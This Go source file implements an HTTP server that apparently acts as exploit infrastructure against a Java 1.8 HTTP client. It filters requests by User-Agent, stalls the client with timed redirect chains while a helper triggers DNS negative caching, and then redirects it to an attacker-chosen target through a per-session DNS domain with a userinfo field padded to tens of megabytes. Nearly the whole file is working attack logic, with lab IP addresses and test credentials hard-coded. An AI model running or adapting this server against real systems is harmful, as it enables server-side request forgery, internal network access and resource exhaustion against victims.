package main

import (
	"context"
	"flag"
	"fmt"
	"log"
	"math"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"
)

const (
	MaxResponseTime = 1500 * time.Millisecond
	KB              = 1024
	MB              = 1024 * KB
	MaxPayloadSize  = 50 * MB
)

type ServerConfig struct {
	Address string
}

type handler struct {
	config    ServerConfig
	xcManager *XCManager
}

func NewHandler(ctx context.Context, serverConfig ServerConfig, xcConfig XCConfig) http.Handler {
	return &handler{
		config:    serverConfig,
		xcManager: NewXCManager(ctx, NewXCClient(xcConfig)),
	}
}

func (h *handler) handleHTTP(writer http.ResponseWriter, request *http.Request) (ok bool) {
	if request.Header.Get("User-Agent") != "Java/1.8.0_252" {
		writer.WriteHeader(200)
		return
	}

	reqTime := time.Now()

	badRequest := func(msg string) bool {
		fmt.Printf("Bad request, %s\n", msg)
		http.Error(writer, msg, http.StatusBadRequest)
		return false
	}

	internalError := func(msg string) bool {
		fmt.Printf("internal error, %s\n", msg)
		http.Error(writer, msg, http.StatusInternalServerError)
		return false
	}

	getQuery := func(key string, def string) string {
		q := request.URL.Query().Get(key)
		if q == "" {
			return def
		}
		return q
	}

	port, err := strconv.Atoi(getQuery("port", "80"))
	if err != nil || port > math.MaxUint16 {
		return badRequest("invalid port")
	}

	target, err := url.Parse(getQuery("target", ""))
	if err != nil {
		return badRequest("invalid target url")
	}

	payloadSize, err := strconv.Atoi(getQuery("payloadSize", strconv.Itoa(25*MB)))
	if err != nil || payloadSize > MaxPayloadSize {
		fmt.Printf("%+v\n", err)
		return badRequest("invalid payload size")
	}

	scheme := getQuery("scheme", "http")
	if scheme != "http" && scheme != "https" {
		return badRequest("invalid scheme")
	}

	startTime, err := strconv.ParseInt(getQuery("startTime", "0"), 10, 64)
	if err != nil || startTime < 0 {
		return badRequest("invalid startTime")
	}

	sleepDuration, err := strconv.Atoi(getQuery("sleepDuration", "8800"))
	sleepDuration = sleepDuration * int(time.Millisecond)
	if err != nil || time.Duration(sleepDuration) > 15*time.Second {
		return badRequest("invalid sleepDuration")
	}

	session := getQuery("session", "")
	var dnsDomain string
	if session == "" {
		session = GenerateRandomName(12)
		dnsDomain, err = BuildDnsDomain(session)
		AssertOk(err)
		fmt.Printf("Generated new session %s\n", session)
		if err := h.xcManager.Submit(session); err != nil {
			return internalError("session submit error")
		}
	} else {
		dnsDomain, err = BuildDnsDomain(session)
		if err != nil {
			return badRequest("invalid session")
		}
	}

	status, ok := h.xcManager.Status(session)
	if !ok {
		return badRequest("session not registered")
	}

	if !status.done {
		startTime = time.Now().Unix()
	} else if status.err != nil {
		fmt.Printf("negative cache trigger failed, error %s\n", status.err)
		return internalError("cannot trigger negative cache")
	} else {
		startTime = status.time.Unix()
	}

	elapsedTime := time.Now().Sub(time.Unix(startTime, 0))
	if elapsedTime < 0 {
		return badRequest("startTime should be less than current time")
	}

	redirectTo := func(dest string) bool {
		writer.Header().Set("Location", dest)
		writer.WriteHeader(302)
		return true
	}

	pendingSleepDuration := time.Duration(sleepDuration) - elapsedTime
	if pendingSleepDuration < 250*time.Millisecond {
		fmt.Println("Executing final redirect")
		username := strings.Repeat("u", payloadSize/2)
		password := strings.Repeat("p", payloadSize-len(username))
		format := scheme + "://" + "username:password@" + dnsDomain + ":" + strconv.Itoa(port) + "/" + target.String()
		fmt.Printf("final redirect to %s\n", format)
		return redirectTo(scheme + "://" + username + ":" + password + "@" + dnsDomain +
			":" + strconv.Itoa(port) + "/" + target.String())
	}

	requestDuration := time.Now().Sub(reqTime)
	sleepNowDuration := pendingSleepDuration
	if sleepNowDuration > (MaxResponseTime - requestDuration) {
		sleepNowDuration = MaxResponseTime - requestDuration
	}

	if sleepNowDuration > 0 {
		fmt.Printf("Sleeping for %d\n", sleepNowDuration)
		time.Sleep(sleepNowDuration)
	}

	values := url.Values{}
	values.Set("session", session)
	values.Set("startTime", strconv.FormatInt(startTime, 10))
	values.Set("port", strconv.Itoa(port))
	values.Set("target", target.String())
	values.Set("payloadSize", strconv.Itoa(payloadSize))
	values.Set("scheme", scheme)
	values.Set("sleepDuration", strconv.Itoa(sleepDuration/int(time.Millisecond)))
	values.Set("random", GenerateRandomName(12))

	redirectUrl := "http://" + h.config.Address + "/redirect?" + values.Encode()
	fmt.Printf("Redirect to %s\n", redirectUrl)
	return redirectTo(redirectUrl)
}

func (h *handler) ServeHTTP(writer http.ResponseWriter, request *http.Request) {
	h.handleHTTP(writer, request)
}

func main() {
	address := flag.String("address", "172.16.146.1:8085", "server address")
	flag.Parse()

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	handler := NewHandler(ctx, ServerConfig{
		Address: *address,
	}, XCConfig{
		Root:     "http://172.16.66.130",
		Username: "testuser",
		Password: "secret",
	})

	logger := log.New(os.Stdout, "http: ", log.LstdFlags)
	server := &http.Server{
		Addr:         *address,
		Handler:      logging(logger)(handler),
		ErrorLog:     logger,
		ReadTimeout:  5 * time.Second,
		WriteTimeout: 10 * time.Second,
		IdleTimeout:  15 * time.Second,
	}

	fmt.Printf("Start server at %s\n", *address)
	if err := server.ListenAndServe(); err != nil {
		panic(err)
	}
}

func logging(logger *log.Logger) func(http.Handler) http.Handler {
	return func(next http.Handler) http.Handler {
		return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			defer func() {
				logger.Println(r.Method, r.URL.Path, r.RemoteAddr, r.UserAgent())
			}()
			next.ServeHTTP(w, r)
		})
	}
}
